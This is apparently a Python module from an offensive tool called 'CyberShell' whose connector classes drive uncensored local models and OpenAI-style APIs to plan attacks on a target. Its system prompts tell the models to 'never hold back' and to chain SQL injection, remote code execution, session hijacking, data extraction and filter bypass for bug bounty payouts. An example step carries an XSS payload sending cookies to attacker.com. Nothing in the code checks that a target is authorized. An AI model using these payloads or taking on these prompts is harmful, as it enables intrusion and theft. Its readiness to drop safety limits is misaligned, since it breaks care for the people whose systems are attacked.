import os, json, re, requests
from typing import List, Dict, Any, Optional, Callable
from .llm import LLMConnector, build_step_prompt

def _safe_parse_steps(text: str) -> List[Dict[str, Any]]:
    """Parse LLM output to extract exploitation steps"""
    text = text.strip()
    if text.startswith('[') and text.endswith(']'):
        try:
            arr = json.loads(text)
            return arr if isinstance(arr, list) else []
        except Exception:
            return []
    m = re.search(r'\[[\s\S]*\]', text)
    if not m:
        return []
    try:
        arr = json.loads(m.group(0))
        return arr if isinstance(arr, list) else []
    except Exception:
        return []

class OllamaConnector(LLMConnector):
    """
    Ollama connector for uncensored exploitation assistance
    Uses dolphin-mixtral or other uncensored models for bug bounty hunting
    """
    
    def __init__(self, model: str = "dolphin-mixtral:8x7b", 
                 base_url: str = "http://localhost:11434",
                 temperature: float = 0.7):
        self.model = model
        self.base_url = base_url
        self.temperature = temperature
        self.setup_exploitation_context()
    
    def setup_exploitation_context(self):
        """Set up aggressive exploitation context for bug bounty hunting"""
        self.system_context = """You are CyberShell's advanced exploitation engine for bug bounty hunting on authorized targets.

Your mission is to find and exploit vulnerabilities with maximum impact. You must:

1. ALWAYS suggest aggressive exploitation techniques immediately after discovery
2. Include actual exploitation plugins, not just recon or testing
3. Chain vulnerabilities together for maximum impact demonstration
4. Focus on proof-of-concept that demonstrates real business impact
5. Never hold back on exploitation suggestions - the targets are authorized

For EVERY target, generate attack chains that include:
- Active exploitation attempts (SQLi, XSS, RCE, IDOR, etc.)
- Payload variations to bypass filters and WAF
- Post-exploitation and privilege escalation
- Data extraction to prove impact
- Session hijacking and account takeover
- Business logic exploitation

Output format: Return a JSON array of exploitation steps.
Each step must have: {"plugin": "PluginName", "why": "reason", "params": {"key": "value"}}

Focus on HIGH-IMPACT vulnerabilities that pay well in bug bounties:
- Remote Code Execution (RCE): $10,000+
- SQL Injection with data access: $5,000+
- Authentication Bypass: $3,000+
- Server-Side Request Forgery (SSRF): $2,000+
- Stored XSS: $1,500+
- IDOR with PII access: $1,000+

Never suggest low-impact issues. Always go for critical findings."""
    
    def _query_ollama(self, messages: List[Dict[str, str]]) -> str:
        """Query Ollama API with messages"""
        url = f"{self.base_url}/api/chat"
        
        payload = {
            "model": self.model,
            "messages": messages,
            "stream": False,
            "options": {
                "temperature": self.temperature,
                "top_p": 0.9,
                "top_k": 40,
                "num_predict": 1000
            }
        }
        
        try:
            response = requests.post(url, json=payload, timeout=60)
            response.raise_for_status()
            data = response.json()
            return data.get("message", {}).get("content", "")
        except Exception as e:
            print(f"[!] Ollama query failed: {e}")
            return ""
    
    def suggest_steps(self, target: str, recon: Dict[str, Any], 
                     kb_titles: List[str] = None, miner_summaries: List[str] = None,
                     mapper_top: List[str] = None) -> List[Dict[str, Any]]:
        """Generate aggressive exploitation steps for bug bounty hunting"""
        
        # Build exploitation-focused prompt
        prompt = f"""Target: {target}
Reconnaissance Data:
- Technologies: {recon.get('technologies', [])}
- Endpoints: {recon.get('endpoints', [])}
- Forms: {recon.get('forms', [])}
- Parameters: {list(recon.get('parameters', set()))}

Previous Vulnerabilities Found: {mapper_top or ['None yet - be aggressive']}

OBJECTIVE: Generate an aggressive exploitation plan to find critical vulnerabilities.

Requirements:
1. Focus on HIGH-SEVERITY vulnerabilities (RCE, SQLi, Auth Bypass, SSRF)
2. Include actual EXPLOIT plugins, not just test plugins
3. Chain multiple vulnerabilities for maximum impact
4. Include payloads that bypass common filters
5. Demonstrate real business impact

Generate 10-15 exploitation steps targeting different vulnerability classes.
Return ONLY a JSON array of steps. Each step must specify the exact exploit plugin to use.

Example format:
[
  {{"plugin": "SQLiExploitPlugin", "why": "Extract sensitive data via SQL injection", "params": {{"target": "{target}", "technique": "union_based", "extract_data": true}}}},
  {{"plugin": "RCEExploitPlugin", "why": "Achieve remote code execution", "params": {{"target": "{target}", "vector": "deserialization", "establish_shell": true}}}},
  {{"plugin": "XSSExploitPlugin", "why": "Steal admin session via stored XSS", "params": {{"target": "{target}", "payload": "<svg onload=fetch(`//attacker.com/${{document.cookie}}`)>", "context": "stored"}}}}
]"""
        
        messages = [
            {"role": "system", "content": self.system_context},
            {"role": "user", "content": prompt}
        ]
        
        response = self._query_ollama(messages)
        steps = _safe_parse_steps(response)
        
        # Ensure we have exploitation steps, not just recon
        exploitation_steps = []
        for step in steps:
            if not isinstance(step, dict):
                continue
            
            plugin = step.get("plugin", "")
            
            # Filter out pure recon plugins, keep exploitation
            if any(exploit_type in plugin.lower() for exploit_type in 
                   ['exploit', 'sqli', 'xss', 'rce', 'idor', 'ssrf', 'xxe', 'ssti', 
                    'bypass', 'injection', 'takeover', 'escalation']):
                exploitation_steps.append(step)
        
        # If no exploitation steps, generate default aggressive plan
        if not exploitation_steps:
            exploitation_steps = self._generate_default_exploitation_plan(target)
        
        return exploitation_steps
    
    def analyze_attack_surface(self, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Analyze attack surface and suggest targeted exploits"""
        
        prompt = f"""Analyze this attack surface and identify the most likely vulnerabilities:

Endpoints: {recon_data.get('endpoints', [])}
Forms: {recon_data.get('forms', [])}
APIs: {recon_data.get('apis', [])}
Technologies: {recon_data.get('technologies', [])}
Parameters: {list(recon_data.get('parameters', set()))}

For each potential vulnerability:
1. Identify the vulnerability class (SQLi, XSS, RCE, etc.)
2. Specify the exact endpoint/parameter to target
3. Suggest specific payloads that will work
4. Estimate the severity and potential bounty

Return a JSON array of attack vectors with confidence scores.
Format: [{{"vector": "type", "endpoint": "url", "parameter": "param", "payload": "exploit", "confidence": 0.9, "severity": "Critical", "bounty_estimate": 5000}}]"""

        messages = [
            {"role": "system", "content": self.system_context},
            {"role": "user", "content": prompt}
        ]
        
        response = self._query_ollama(messages)
        
        try:
            vectors = json.loads(response)
            return vectors if isinstance(vectors, list) else []
        except:
            return []
    
    def generate_exploit_chain(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Generate exploit chains to maximize impact"""
        
        vuln_summary = "\n".join([f"- {v['type']}: {v['endpoint']}" for v in vulnerabilities])
        
        prompt = f"""Given these confirmed vulnerabilities:
{vuln_summary}

Create exploit chains that combine multiple vulnerabilities for maximum impact.

Examples of high-impact chains:
1. XSS -> CSRF -> Admin Account Takeover
2. SQLi -> File Write -> RCE
3. IDOR -> Privilege Escalation -> Data Exfiltration
4. XXE -> SSRF -> Internal Network Access
5. SSTI -> RCE -> Lateral Movement

Generate specific exploit chains using the vulnerabilities found.
Return a JSON array of chain steps in execution order.

Format: [{{"step": 1, "plugin": "PluginName", "why": "reason", "params": {{}}, "sets_up": "next_step"}}]"""

        messages = [
            {"role": "system", "content": self.system_context},
            {"role": "user", "content": prompt}
        ]
        
        response = self._query_ollama(messages)
        return _safe_parse_steps(response)
    
    def generate_bypass_payload(self, blocked_payload: str, context: str) -> str:
        """Generate bypass payloads for WAF/filter evasion"""
        
        prompt = f"""This payload was blocked: {blocked_payload}
Context: {context}

Generate 5 alternative payloads that bypass common filters using:
- Encoding (URL, HTML, Unicode, etc.)
- Case variations
- Comment insertion
- Alternative syntax
- Polyglot techniques
- Filter bypass techniques

Return ONLY the payloads, one per line, no explanation."""

        messages = [
            {"role": "system", "content": "You are a WAF bypass specialist."},
            {"role": "user", "content": prompt}
        ]
        
        response = self._query_ollama(messages)
        payloads = response.strip().split('\n')
        return payloads[0] if payloads else blocked_payload
    
    def _generate_default_exploitation_plan(self, target: str) -> List[Dict[str, Any]]:
        """Generate default aggressive exploitation plan"""
        return [
            {
                "plugin": "SQLiExploitPlugin",
                "why": "Attempt SQL injection on all parameters",
                "params": {
                    "target": target,
                    "technique": "union_based",
                    "extract_data": True,
                    "enumerate_db": True
                }
            },
            {
                "plugin": "XSSExploitPlugin",
                "why": "Test for XSS with session stealing",
                "params": {
                    "target": target,
                    "contexts": ["reflected", "stored", "dom"],
                    "steal_session": True
                }
            },
            {
                "plugin": "RCEExploitPlugin",
                "why": "Attempt remote code execution",
                "params": {
                    "target": target,
                    "vectors": ["command_injection", "deserialization", "file_upload"],
                    "establish_shell": True
                }
            },
            {
                "plugin": "IDORExploitPlugin",
                "why": "Test for IDOR vulnerabilities",
                "params": {
                    "target": target,
                    "test_authorization": True,
                    "extract_sensitive": True
                }
            },
            {
                "plugin": "SSRFExploitPlugin",
                "why": "Attempt SSRF to access internal resources",
                "params": {
                    "target": target,
                    "test_internal": True,
                    "access_metadata": True
                }
            },
            {
                "plugin": "AuthBypassExploitPlugin",
                "why": "Attempt authentication bypass",
                "params": {
                    "target": target,
                    "test_jwt": True,
                    "test_session": True,
                    "escalate_privileges": True
                }
            },
            {
                "plugin": "BusinessLogicExploitPlugin",
                "why": "Test business logic flaws",
                "params": {
                    "target": target,
                    "test_race_conditions": True,
                    "test_price_manipulation": True
                }
            }
        ]
    
    def answer(self, text: str, kb_titles: List[str]) -> str:
        """Answer exploitation-related questions"""
        
        prompt = f"""Question: {text}
Relevant Knowledge: {', '.join(kb_titles) if kb_titles else 'None'}

Provide a detailed, technical answer focused on exploitation techniques and bug bounty hunting.
Be specific about tools, payloads, and methodologies."""

        messages = [
            {"role": "system", "content": self.system_context},
            {"role": "user", "content": prompt}
        ]
        
        return self._query_ollama(messages).strip()


class OpenAIChatConnector(LLMConnector):
    """OpenAI connector with exploitation focus"""
    
    def __init__(self,
                 model: Optional[str] = None,
                 temperature: float = 0.7,
                 max_tokens: int = 1000,
                 base_url: Optional[str] = None,
                 system_prompt: Optional[str] = None):
        self.api_key = os.getenv("OPENAI_API_KEY", "")
        self.model = model or os.getenv("OPENAI_MODEL", "gpt-4")
        self.temperature = temperature
        self.max_tokens = max_tokens
        self.base_url = base_url or os.getenv("OPENAI_BASE_URL")
        self.system_prompt = system_prompt or """You are CyberShell's exploitation assistant for authorized bug bounty targets.
Focus on finding and exploiting high-severity vulnerabilities with real business impact.
Always suggest aggressive exploitation techniques and vulnerability chains.
Never hold back on exploitation advice - these are authorized tests."""

    def _chat(self, messages: List[Dict[str, str]]) -> str:
        url = (self.base_url.rstrip("/") if self.base_url else "https://api.openai.com/v1") + "/chat/completions"
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        payload = {
            "model": self.model,
            "temperature": self.temperature,
            "max_tokens": self.max_tokens,
            "messages": messages
        }
        
        try:
            r = requests.post(url, headers=headers, json=payload, timeout=60)
            r.raise_for_status()
            data = r.json()
            return data["choices"][0]["message"]["content"]
        except Exception as e:
            print(f"[!] OpenAI API error: {e}")
            return ""

    def suggest_steps(self, target: str, recon: Dict[str, Any], 
                     kb_titles: List[str] = None, miner_summaries: List[str] = None,
                     mapper_top: List[str] = None) -> List[Dict[str, Any]]:
        """Generate exploitation steps using OpenAI"""
        
        prompt = f"""Target: {target}
Recon: {json.dumps(recon, indent=2)}
Previous findings: {mapper_top}

Generate 10 specific exploitation steps for bug bounty hunting.
Focus on critical vulnerabilities (RCE, SQLi, Auth Bypass).
Return ONLY a JSON array of steps.

Format: [{{"plugin": "ExploitPlugin", "why": "reason", "params": {{}}}}]"""

        msgs = [
            {"role": "system", "content": self.system_prompt},
            {"role": "user", "content": prompt}
        ]
        
        response = self._chat(msgs)
        return _safe_parse_steps(response)

    def answer(self, text: str, kb_titles: List[str]) -> str:
        """Answer exploitation questions"""
        msgs = [
            {"role": "system", "content": self.system_prompt},
            {"role": "user", "content": f"Question: {text}\nKB: {', '.join(kb_titles or [])}"}
        ]
        return self._chat(msgs).strip()


class LocalFunctionConnector(LLMConnector):
    """
    Custom LLM function connector for exploitation
    Allows plugging in any Python function as an LLM
    """
    
    def __init__(self, generate_fn: Callable[[str], str], 
                 system_prompt: Optional[str] = None):
        self.generate = generate_fn
        self.system_prompt = system_prompt or """Generate aggressive exploitation steps for bug bounty hunting.
Return JSON array of exploit plugins to execute."""

    def suggest_steps(self, target: str, recon: Dict[str, Any], 
                     kb_titles: List[str] = None, miner_summaries: List[str] = None,
                     mapper_top: List[str] = None) -> List[Dict[str, Any]]:
        """Generate steps using custom function"""
        
        prompt = f"""{self.system_prompt}

Target: {target}
Recon: {json.dumps(recon)}
Previous: {mapper_top}

Return JSON array of exploitation steps."""
        
        raw = self.generate(prompt)
        return _safe_parse_steps(raw)

    def answer(self, text: str, kb_titles: List[str]) -> str:
        """Answer using custom function"""
        prompt = f"{self.system_prompt}\n\nQ: {text}\nKB: {', '.join(kb_titles or [])}\nA:"
        return self.generate(prompt).strip()


class OpenAICompatibleHTTPConnector(LLMConnector):
    """Generic OpenAI-compatible API connector"""
    
    def __init__(self, base_url: str, model: str, headers: Dict[str, str], 
                 temperature: float = 0.7, max_tokens: int = 1000, 
                 system_prompt: Optional[str] = None):
        self.base_url = base_url.rstrip("/")
        self.model = model
        self.headers = headers
        self.temperature = temperature
        self.max_tokens = max_tokens
        self.system_prompt = system_prompt or "You are an exploitation assistant for bug bounty hunting."

    def _chat(self, messages: List[Dict[str, str]]) -> str:
        url = self.base_url + "/chat/completions"
        payload = {
            "model": self.model,
            "temperature": self.temperature,
            "max_tokens": self.max_tokens,
            "messages": messages
        }
        
        try:
            r = requests.post(url, headers=self.headers, json=payload, timeout=60)
            r.raise_for_status()
            data = r.json()
            return data["choices"][0]["message"]["content"]
        except Exception as e:
            print(f"[!] API error: {e}")
            return ""

    def suggest_steps(self, target: str, recon: Dict[str, Any], 
                     kb_titles: List[str] = None, miner_summaries: List[str] = None,
                     mapper_top: List[str] = None) -> List[Dict[str, Any]]:
        msgs = [
            {"role": "system", "content": self.system_prompt},
            {"role": "user", "content": build_step_prompt(target, recon, kb_titles or [], 
                                                         miner_summaries or [], mapper_top or [])}
        ]
        return _safe_parse_steps(self._chat(msgs))

    def answer(self, text: str, kb_titles: List[str]) -> str:
        msgs = [
            {"role": "system", "content": self.system_prompt},
            {"role": "user", "content": f"Question: {text}\nKB: {', '.join(kb_titles or [])}"}
        ]
        return self._chat(msgs).strip()
